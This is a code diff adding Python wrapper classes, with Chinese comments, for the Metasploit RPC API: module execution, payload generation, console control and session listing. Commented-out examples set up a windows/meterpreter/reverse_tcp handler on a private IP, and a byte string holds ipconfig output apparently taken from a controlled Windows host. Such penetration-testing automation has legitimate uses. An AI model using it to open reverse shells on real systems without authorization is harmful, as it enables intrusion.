@@ -230,11 +230,103 @@ class MSFModuleInfo:#返回一个模块的详细信息
         }
         return module_info
 
-#MSFPermanentToken().result("123")
+
+class MSFModuleOptions:#返回一个模块设置需要的参数
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid,ModuleType,ModuleName):
+        self.login_api_data = msgpack.packb(["module.options", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName])#分别获取token,模块类型,模块名字
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        print(con)
+
+
+#有问题
+class MSFModuleExecute:#返回一个执行的JobID,或者16禁制payload
+    def __init__(self):
+        self.req = MSFConnection()
+    def execute(self,Uid,ModuleType,ModuleName,**kwargs):#这个是启动服务,应该传入完整的字典kwargs
+        self.login_api_data = msgpack.packb(["module.execute", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName,kwargs])#分别获取token,模块类型,模块名字，IP和端口
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+    def payload(self,Uid,ModuleType,ModuleName,**kwargs):#这个是生成16禁制payload
+        self.login_api_data = msgpack.packb(["module.execute", MSFTokenDataSheet().Inquire(Uid),ModuleType,ModuleName,kwargs])#分别获取token,模块类型,模块名字，IP和端口
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+
+        return con
+
+class MSFConsoleCreate:
+    def __init__(self):
+        self.req = MSFConnection()
+    def execute(self,Uid):#这个是启动服务,应该传入完整的字典kwargs
+        self.login_api_data = msgpack.packb(["console.create", MSFTokenDataSheet().Inquire(Uid)])#分别获取token,模块类型,模块名字，IP和端口
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+
+class MSFConsoleDestroy:#删除一个终端
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid,ConsoleID):#最后一个参数是终端ID
+        self.login_api_data = msgpack.packb(["console.destroy", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+
+class MSFConsoleList:#获取一个终端列表
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid):
+        self.login_api_data = msgpack.packb(["console.list", MSFTokenDataSheet().Inquire(Uid)])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+
+class MSFConsoleWrite:#对终端进行写入操作，用法和平时操作msfconsole那样，但需要给不同的命令后加上换行
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid,ConsoleID,Command):#这里别传入用户token,创建的命令行ID,以及命令
+        self.login_api_data = msgpack.packb(["console.write", MSFTokenDataSheet().Inquire(Uid),ConsoleID,Command])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+
+class MSFConsoleRead:#对控制台内容进行读取
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid,ConsoleID):
+        self.login_api_data = msgpack.packb(["console.read", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+
+        return con
+
+class MSFConsoleSessionKill:#console.session_kill方法使用Control + C快捷方式模拟用户以中止Metasploit Framework控制台中的交互式会话。
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid,ConsoleID):
+        self.login_api_data = msgpack.packb(["console.session_kill", MSFTokenDataSheet().Inquire(Uid),ConsoleID])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+
+        return con
+
+class MSFSessionList:
+    def __init__(self):
+        self.req = MSFConnection()
+    def result(self,Uid):
+        self.login_api_data = msgpack.packb(["session.list", MSFTokenDataSheet().Inquire(Uid)])
+        self.req.request("POST", "/api", body=self.login_api_data, headers=headers)
+        con = msgpack.unpackb(self.req.getresponse().read())  # 将返回二进制参数进行转码成json
+        return con
+
+#MSFPermanentToken().result("123")#初始化
 # print(MSFTokenList().result())
 # print(MSFTokenDataSheet().Inquire("123"))#获取用户Token
 #print(MSFLoadModuleStats().result("123"))
-# print(MSFJobList().result("123"))
+#print(MSFJobList().result("123"))
 # print(MSFGetModuleList().encoders("123"))
 # print(MSFGetModuleList().nops("123"))
 # print(MSFGetModuleList().post("123"))
@@ -242,4 +334,18 @@ class MSFModuleInfo:#返回一个模块的详细信息
 # print(MSFGetModuleList().auxiliary("123"))
 # print(MSFGetModuleList().exploits("123"))
 #print(MSFModuleInfo().result("123","exploit","aix/local/ibstat_path"))
-
+#print(MSFModuleExecute().payload("123","exploit","multi/handler",RHOST="192.168.0.152",RPORT="8005",EnableStageEncoding="true"))
+# print(MSFConsoleCreate().result("123"))
+# print(MSFConsoleList().result("123"))
+# print(MSFConsoleDestroy().result("123","2"))
+# cmd="""use multi/handler
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST 192.168.0.152
+# set LPORT 4444
+# run"""
+# print(MSFConsoleWrite().result("123","0",cmd))
+# print(MSFConsoleRead().result("123","0"))
+#print(MSFConsoleSessionKill().result("123","0"))
+print(MSFSessionList().result("123"))
+by=b'\r\nWindows IP \xc5\xe4\xd6\xc3\r\n\r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xd2\xd4\xcc\xab\xcd\xf8:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xb1\xbe\xb5\xd8\xc1\xac\xbd\xd3* 2:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xb1\xbe\xb5\xd8\xc1\xac\xbd\xd3* 11:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 VMware Network Adapter VMnet1:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::c78:8c04:797d:d24e%6\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.220.1\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 VMware Network Adapter VMnet8:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::e977:faa:3153:7acd%12\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.12.1\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : \r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xd2\xd4\xcc\xab\xcd\xf8 2:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n\r\n\xce\xde\xcf\xdf\xbe\xd6\xd3\xf2\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 WLAN:\r\n\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n   \xb1\xbe\xb5\xd8\xc1\xb4\xbd\xd3 IPv6 \xb5\xd8\xd6\xb7. . . . . . . . : fe80::9cd3:62cf:5957:939d%19\r\n   IPv4 \xb5\xd8\xd6\xb7 . . . . . . . . . . . . : 192.168.0.142\r\n   \xd7\xd3\xcd\xf8\xd1\xda\xc2\xeb  . . . . . . . . . . . . : 255.255.255.0\r\n   \xc4\xac\xc8\xcf\xcd\xf8\xb9\xd8. . . . . . . . . . . . . : 192.168.0.1\r\n\r\n\xd2\xd4\xcc\xab\xcd\xf8\xca\xca\xc5\xe4\xc6\xf7 \xc0\xb6\xd1\xc0\xcd\xf8\xc2\xe7\xc1\xac\xbd\xd3:\r\n\r\n   \xc3\xbd\xcc\xe5\xd7\xb4\xcc\xac  . . . . . . . . . . . . : \xc3\xbd\xcc\xe5\xd2\xd1\xb6\xcf\xbf\xaa\xc1\xac\xbd\xd3\r\n   \xc1\xac\xbd\xd3\xcc\xd8\xb6\xa8\xb5\xc4 DNS \xba\xf3\xd7\xba . . . . . . . : \r\n'
+print(str(by, encoding='gbk' ))
